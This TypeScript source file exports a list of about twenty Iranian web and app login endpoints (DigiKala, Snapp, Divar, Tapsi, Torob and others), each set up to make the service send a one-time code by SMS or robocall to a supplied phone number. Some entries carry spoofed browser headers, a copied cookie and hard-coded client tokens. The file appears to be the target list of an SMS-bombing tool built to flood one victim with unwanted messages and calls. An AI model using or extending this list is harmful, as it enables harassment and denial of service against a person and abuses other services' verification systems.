const randomnum = Math.floor(Math.random() * 1000000);
export const API = (number: number) => {
  const list = [
    // ---------------- POSTs ----------------
    {
      url: "https://api.digikala.com/v1/user/authenticate/",
      data: { username: "0" + number, force_send_otp: true },
      name: "DigiKala",
      type: "WEB",
      method: "POST",
    },
    {
      url: `https://digitalsignup.snapp.ir/ds3/api/v3/otp`,
      data: { cellphone: `+98${number}` },
      name: "Snapp",
      type: "WEB",
      method: "POST",
    },
    {
      url: "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
      data: { UserName: `+98${number}` },
      name: "Namava",
      type: "APK",
      method: "POST",
    },
    {
      url: "https://allinco.ir/api/Users/signIn",
      data: {
        deviceId: "86eb30f27c0b58bb",
        hashCode: "Aq1/XpLps/v",
        mobile: `0${number}`,
      },
      name: "Allinco",
      type: "APK",
      method: "POST",
    },
    {
      url: "https://api.komodaa.com/api/v2.6/loginRC/request",
      data: { phone_number: `0${number}` },
      name: "Komodaa",
      type: "APK",
      method: "POST",
    },
    {
      url: "https://api.baarbaanet.com/v1/pub/otp/send?operation=REGISTER",
      data: {
        mobile: `0${number}`,
        viaSms: true,
        viaEmail: false,
      },
      name: "Baarbaanet",
      type: "WEB",
      method: "POST",
    },
    {
      url: "https://bornosmode.com/api/loginRegister/",
      data: {
        mobile: `0${number}`,
      },
      name: "Bornosmode",
      type: "WEB",
      method: "POST",
    },
    {
      url: "https://livito.tv/api/oauth/initialize",
      data: {
        grant_type: "password",
        channel: "PASSWORD",
        scope: "*",
        username: `0${number}`,
      },
      name: "Livito",
      type: "WEB",
      method: "POST",
    },
    {
      url: "https://api.divar.ir/v5/auth/authenticate",
      data: { phone: `0${number}` },
      name: "Divar",
      type: "WEB",
      method: "POST",
    },
    {
      url: "https://api.zarinplus.com/user/zarinpal-login",
      data: { phone_number: `98${number}` },
      name: "ZarinPlus",
      type: "WEB",
      method: "POST",
    },
    {
      url: "https://api.tapsi.cab/api/v2.2/user",
      data: {
        credential: {
          phoneNumber: `0${number}`,
          role: "PASSENGER",
        },
        otpOption: "ROBO_CALL",
      },
      name: "Tapsi",
      type: "WEB",
      method: "POST",
    },
    {
      url: "https://api.tapsi.cab/api/v2.2/user",
      data: {
        credential: {
          phoneNumber: `0${number}`,
          role: "PASSENGER",
        },
        otpOption: "SMS",
      },
      name: "Tapsi",
      type: "WEB",
      method: "POST",
    },
    {
      url: "https://api2.hitro.mobi/api/passengerinfo/InsertPassenger",
      data: {
        ClientId: `0${number}`,
        ClientSecret: "0501098153736800398716253736091541224",
        Name: "kdccs",
        Family: "kdccs",
        Email: `kdccs${randomnum}du@gmail.com`,
      },
      name: "Hitro",
      type: "WEB",
      method: "POST",
    },
    {
      url: "https://api.behtarino.com/api/v1/businesses/uqqnffxwen/vitrin_verification/",
      data: { phone: `0${number}` },
      name: "Behtarino",
      type: "WEB",
      method: "POST",
    },
    {
      url: "http://behtamarket.com//getRegister.php?n=shinaweb&activeBySms=true",
      data:
        "e=0" +
        `${number}` +
        "&adres=&p=r%24%24tme1&name=wadawdawdawd&em=&moaref=&bazaryab_code=&shahrestan_id=0&codeposti=&tel=",
      name: "BehtaMarket",
      type: "APK",
      method: "POST",
      package_name: "com.persiandesigners.behtamarket",
    },
    {
      url: "https://kasbinoapp.ir/kasbinoEngine1/RequestC",
      data: `{"p1001":"0${number}","p1002":"registerSms","token":"e0d4cc39-b5d3-47ea-8ede-6ead5eed3b8a.e000af00-d00d-0da0-0f00-000d00000cc0","RC":"7be86c2a5b54"}`,
      name: "KasbinoApp",
      type: "WEB",
      method: "POST",
    },
    {
      url: "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one",
      data: {
        code: "98",
        phone: `${number}`,
        smsStatus: "default",
      },
      name: "Telewebion",
      type: "WEB",
      method: "POST",
    },
    {
      url: "http://civapp.ir//getRegister.php?n=shinaweb&activeBySms=true",
      data:
        "e=0" +
        `${number}` +
        "&adres=&p=r%24%24tme1&name=wadawdawdawd&em=&moaref=&bazaryab_code=&shahrestan_id=0&codeposti=&tel=",
      name: "Civapp",
      type: "APK",
      method: "POST",
      package_name: "com.persiandesigners.civapp",
    },
    // ---------------- GETs ----------------

    {
      url: `https://api.torob.com/a/phone/send-pin/?phone_number=0${number}`,
      name: "Torob",
      headers: {
        Host: "api.torob.com",
        "user-agent":
          "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
        accept: "*/*",
        origin: "https://torob.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        referer: "https://torob.com/user/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language":
          "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6",
        cookie:
          "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com\u003deyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9",
      },
      type: "WEB",
    },
    {
      url: `https://core.gap.im/v1/user/add.json?mobile=0${number}`,
      name: "CoreGap",
      type: "WEB",
    },
  ];
  return list;
};
